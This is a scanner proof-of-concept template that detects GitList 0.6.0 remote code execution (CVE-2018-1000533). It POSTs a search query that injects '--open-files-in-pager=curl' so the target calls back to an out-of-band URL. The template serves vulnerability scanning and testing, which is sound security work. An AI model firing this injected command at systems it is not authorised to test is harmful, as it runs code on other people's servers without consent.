name: poc-yaml-gitlist-cve-2018-1000533-rce
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  - method: GET
    path: "/"
    follow_redirects: false
    search: |
      <span class="name">(?P<project>.+?)</span>
    expression:
      response.body.bcontains(bytes(string("GitList"))) && response.status == 200
  - method: POST
    path: "/{{project}}/tree/a/search"
    headers:
      Content-Type: application/x-www-form-urlencoded
    follow_redirects: false
    body: |
      query=--open-files-in-pager=curl+-m+3+{{reverseURL}};
    expression:
      response.status == 200 && reverse.wait(6)
detail:
  author: tangshoupu
  info: gitlist 0.6.0 RCE（CVE-2018-1000533）
  links:
    - https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533
